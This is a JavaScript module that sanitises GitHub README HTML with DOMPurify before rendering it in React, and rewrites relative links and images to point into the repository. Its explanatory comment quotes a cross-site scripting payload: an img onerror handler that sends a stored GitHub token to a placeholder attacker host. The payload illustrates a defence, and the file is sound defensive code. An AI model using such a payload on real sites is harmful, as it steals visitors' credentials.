import DOMPurify from 'dompurify'

/*
  Why DOMPurify?

  GitHub gives us the README as an HTML string. The only way to show HTML
  from a string in React is dangerouslySetInnerHTML, and the name is a
  warning: whatever is in that string becomes real DOM on OUR page.
  A README is written by a stranger. If it slipped through something like
    <img src=x onerror="fetch('https://evil.example?t='+localStorage.getItem('scout-gh-token'))">
  it would run with our page's permissions and could steal the visitor's
  saved token. GitHub does sanitise its rendering, but we shouldn't bet our
  users' tokens on another service never making a mistake (defence in depth).

  DOMPurify parses the HTML and removes anything that can run code:
  <script>, on* event handlers, javascript: URLs, <iframe>, <form> and so
  on, keeping only safe formatting. We also forbid inline styles so a
  README can't overlay fake UI on our page.

  Our hook then fixes up URLs: relative links and images in a README point
  into the repo, but on our site they would resolve against scout's URL.
*/

let base = null // { owner, repo } for the README being sanitised

DOMPurify.addHook('afterSanitizeAttributes', (node) => {
  if (!base) return
  const { owner, repo } = base

  if (node.tagName === 'A' && node.hasAttribute('href')) {
    const href = node.getAttribute('href')
    if (href.startsWith('#')) {
      // GitHub prefixes heading ids with "user-content-"
      if (!href.startsWith('#user-content-')) node.setAttribute('href', `#user-content-${href.slice(1)}`)
      return
    }
    if (!/^[a-z][a-z\d+.-]*:/i.test(href)) {
      node.setAttribute('href', new URL(href.replace(/^\.?\//, ''), `https://github.com/${owner}/${repo}/blob/HEAD/`).href)
    }
    node.setAttribute('target', '_blank')
    node.setAttribute('rel', 'noopener noreferrer')
  }

  if (node.tagName === 'IMG' && node.hasAttribute('src')) {
    const src = node.getAttribute('src')
    if (!/^[a-z][a-z\d+.-]*:/i.test(src) && !src.startsWith('//')) {
      node.setAttribute('src', new URL(src.replace(/^\.?\//, ''), `https://raw.githubusercontent.com/${owner}/${repo}/HEAD/`).href)
    }
    node.setAttribute('loading', 'lazy')
    if (!node.hasAttribute('alt')) node.setAttribute('alt', '')
  }
})

export function sanitizeReadme(html, owner, repo) {
  base = { owner, repo }
  try {
    return DOMPurify.sanitize(html, {
      USE_PROFILES: { html: true }, // HTML only: no SVG or MathML tricks
      FORBID_TAGS: ['style', 'form', 'input', 'button', 'textarea', 'select'],
      FORBID_ATTR: ['style'],
    })
  } finally {
    base = null
  }
}
